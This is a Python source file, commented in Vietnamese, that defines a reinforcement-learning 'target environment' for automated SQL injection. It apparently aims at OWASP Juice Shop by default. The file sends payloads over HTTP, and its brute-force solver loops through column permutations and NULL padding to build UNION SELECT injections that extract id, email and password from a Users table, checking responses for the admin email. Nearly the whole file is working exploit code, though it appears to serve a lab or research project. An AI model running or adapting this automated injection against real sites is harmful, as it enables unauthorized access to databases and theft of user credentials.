import requests
import time
import re
import itertools
import json
import configparser
from src.environment.base_environment import BaseEnvironment
from src.core.action_space import ActionSpace
from src.core.reward_system import RewardSystem
from src.core.state_manager import StateManager

class TargetEnvironment(BaseEnvironment):
    def __init__(self, config_file):
        config = configparser.ConfigParser()
        config.read(config_file, encoding='utf-8')
        
        target_cfg = config['Target']
        self.url = target_cfg.get('url')
        self.search_param = target_cfg.get('search_param', 'q') 
        self.success_marker = target_cfg.get('success_marker', 'admin@juice-sh.op')
        self.error_marker = "SQLITE_ERROR" 
        
        self.proxies = None 
        # self.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

        self.action_space = ActionSpace()
        self.state_manager = StateManager()
        
        # Mode Target
        self.reward_system = RewardSystem(
            normal_count=0,
            success_marker=self.success_marker,
            error_marker=self.error_marker,
            env_type='target' 
        )
        
        self.request_count = 0
        
        print(f"[TargetEnv] Init OK. URL: {self.url}")

    def reset(self):
        self.request_count = 0 
        return self.state_manager.reset_state()

    def _send_payload(self, payload):
        """Gửi payload lên Web thật"""
        try:
            self.request_count += 1 # [MỚI] Tăng biến đếm
            
            params = {self.search_param: payload}
            resp = requests.get(self.url, params=params, proxies=self.proxies, timeout=5)
            return resp
        except requests.exceptions.RequestException as e:
            return None

    def step(self, action_index):
        action_string = self.action_space.get_action_string(action_index)
        new_state_vector = self.state_manager.update_state(action_string, action_index)
        payload_str = self.state_manager.current_state
        
        # Gửi Request thật
        response = self._send_payload(payload_str)
        
        # Nếu response = None (lỗi mạng) -> Tạo response giả để không crash
        if response is None:
            response = type('Response', (), {'status_code': 500, 'text': ''})

        reward, done = self.reward_system.calculate_reward(response, payload_str)
        return new_state_vector, reward, done

    def get_action_space_size(self):
        return self.action_space.get_action_space_size()

    # =========================================================================
    #  SOLVER: BỘ NÃO SẮP XẾP (Đã được chuyển hóa cho HTTP)
    # =========================================================================
    def brute_force_exploit(self, raw_payload):
        print(f"\n[Target Solver] Phân tích payload thô từ AI: {raw_payload}")

        # 1. Trích xuất khung
        match_union = re.search(r"(.*?)UNION", raw_payload, re.IGNORECASE)
        match_from = re.search(r"(FROM.*)", raw_payload, re.IGNORECASE)
        
        # --- LUẬT MỚI: KHÔNG CÓ KHUNG LÀ CHO OUT LUÔN ---
        if match_union:
            prefix = match_union.group(1) + " UNION"
        else:
            print("[-] Solver: AI không tìm thấy UNION -> Payload rác -> Hủy bỏ.")
            return False, None # <--- Random chết tại đây

        if match_from:
            suffix = match_from.group(1)
        else:
            # Riêng FROM thì có thể châm chước (vì AI hay quên), 
            # nhưng nếu muốn nghiêm khắc thì return False luôn cũng được.
            # Ở đây ta tạm thời vẫn nhắc bài phần FROM, nhưng bắt buộc phải có UNION.
            suffix = " FROM Users--"

        # 2. Lấy cột
        detected = [x for x in ["id", "email", "password"] if x.upper() in raw_payload.upper()]
        required = ["id", "email", "password"]
        core_cols = []
        for req in required:
            found = False
            for det in detected:
                if req.upper() in det.upper():
                    core_cols.append(req); found = True; break
            if not found: core_cols.append(req)
            
        print(f"[Target Solver] Khung: {prefix} ... {suffix}")
        print(f"[Target Solver] Cột: {core_cols}. Đang bắn HTTP để dò NULL...")

        # 3. Vòng lặp bắn phá
        # Thử từ 0 đến 10 NULL (Web thật có thể nhiều cột hơn Mock)
        for num_nulls in range(11):
            col_permutations = list(itertools.permutations(core_cols))
            
            # Chỉ in 1 lần cho đỡ rác log
            # print(f"  -> Thử inject với {num_nulls} NULL...") 
            
            for p in col_permutations:
                # Case A: NULL sau
                items_A = list(p) + ["NULL"] * num_nulls
                payload_A = f"{prefix} SELECT {', '.join(items_A)} {suffix}"
                if self._check_http_payload(payload_A): return True, payload_A

                # Case B: NULL trước
                items_B = ["NULL"] * num_nulls + list(p)
                payload_B = f"{prefix} SELECT {', '.join(items_B)} {suffix}"
                if self._check_http_payload(payload_B): return True, payload_B

        return False, None

    def _check_http_payload(self, payload):
        """Hàm check riêng cho Solver dùng HTTP Request"""
        # Clean rác
        clean_payload = payload.replace("SELECT SELECT", "SELECT").replace("FROM FROM", "FROM")
        
        # Bắn lên web thật
        resp = self._send_payload(clean_payload) # Nó sẽ gọi cái hàm có bộ đếm ở trên
        
        if resp and resp.status_code == 200:
            if self.success_marker in resp.text:
                return True
        return False